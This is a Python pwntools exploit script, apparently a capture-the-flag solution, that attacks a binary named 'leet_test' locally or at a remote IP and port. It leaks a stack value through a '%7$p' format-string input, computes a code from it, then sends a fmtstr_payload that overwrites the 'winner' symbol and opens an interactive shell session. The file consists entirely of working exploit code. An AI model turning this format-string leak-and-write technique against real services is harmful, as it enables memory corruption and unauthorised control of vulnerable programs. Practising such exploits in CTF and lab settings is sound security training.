#!/usr/bin/env python3


from pwn import *
from ctypes import *

BINARY = "./leet_test"
ADDR = "206.189.121.131"
PORT = 31331

splash()
elf = context.binary = ELF(BINARY)


class Constants:
    secret_value = c_int(0x1337C0DE)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    payload = b"%7$p"
    io.sendlineafter("Please enter your name: ", flat(payload))
    io.recvuntil("Hello, ")
    random_number = c_ushort(int(io.recvuntil("\n")[:-9], 16))
    log.success(f"random number discovered: {hex(random_number.value)}")
    final_value = c_uint(Constants.secret_value.value * random_number.value)
    log.success(f"found final code: {hex(final_value.value)}")
    writes = {elf.sym.winner: final_value.value}
    payload = fmtstr_payload(10, writes, 0, write_size="short")
    io.sendlineafter("Please enter your name: ", flat(payload))

    io.interactive()


if __name__ == "__main__":
    solve()
